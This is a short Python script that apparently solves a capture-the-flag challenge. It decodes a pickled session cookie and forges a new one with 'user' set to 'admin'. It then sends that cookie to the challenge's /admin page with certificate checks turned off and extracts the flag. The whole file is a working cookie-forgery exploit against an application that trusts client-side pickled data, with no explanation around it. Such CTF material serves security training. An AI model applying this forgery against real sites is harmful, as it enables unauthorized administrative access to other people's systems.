#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-05-01 11:32:56
# @Last Modified by:   john
# @Last Modified time: 2016-05-01 11:37:28

import base64 as b
import pickle
import requests
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

p =  b.b64decode('KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu')
# print pickle.loads(p)

ours = {'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}
o = pickle.dumps(ours)
cookie = b.b64encode(o)

s = requests.Session()
s.cookies.update({'obsoletePickle':cookie})
r = s.get('https://spotted-quoll.ctfcompetition.com/admin', verify=False)
content= r.text

matched = re.search('CTF{.*}', content)
print matched.group()
